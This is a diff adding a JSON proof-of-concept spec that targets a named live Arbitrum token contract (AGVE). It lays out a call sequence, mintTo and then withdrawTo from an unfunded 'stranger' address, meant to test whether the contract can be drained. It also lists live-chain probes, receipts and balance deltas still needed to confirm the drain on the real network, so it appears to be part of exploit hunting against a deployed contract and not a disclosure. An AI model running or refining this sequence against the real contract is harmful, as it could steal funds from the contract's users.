@@ -1,0 +1,21 @@
+{
+  "poc_id": "poc-2-agve-withdrawto",
+  "chain": "arbitrum",
+  "rpc_url": "https://arb1.arbitrum.io/rpc",
+  "address": "0x848e0ba28b637e8490d88bae51fa99c87116409b",
+  "hypothesis": "AGVE withdrawTo(address,uint256) is a stranger-reachable token payout path (live probe succeeded). Chained sequence: first mint 1 AGVE to the stranger via mintTo, then withdrawTo 0.5 AGVE to the stranger. The fork shows whether withdrawTo burns the stranger's balance, pays out underlying value, or reverts. If it pays out value beyond the stranger's own deposit, that is the drain shape; if it only burns the stranger's own minted balance, the payout is caller-metered.",
+  "steps": [
+    {"sig": "mintTo(address,uint256)", "args": ["STRANGER", "1000000000000000000"]},
+    {"sig": "withdrawTo(address,uint256)", "args": ["STRANGER", "500000000000000000"]}
+  ],
+  "reads": [
+    {"sig": "balanceOf(address)", "args": ["STRANGER"]},
+    {"sig": "totalSupply()", "args": []}
+  ],
+  "still_needed_for_verified_real": [
+    "live decisive-amount probe of the full mint-then-withdraw sequence from an unfunded stranger",
+    "live receipts for both calls",
+    "live balance deltas (stranger token balance + any underlying payout) measured on the live chain",
+    "proof the withdrawn value is not just the stranger's own minted balance (i.e. it exceeds what the stranger put in)"
+  ]
+}
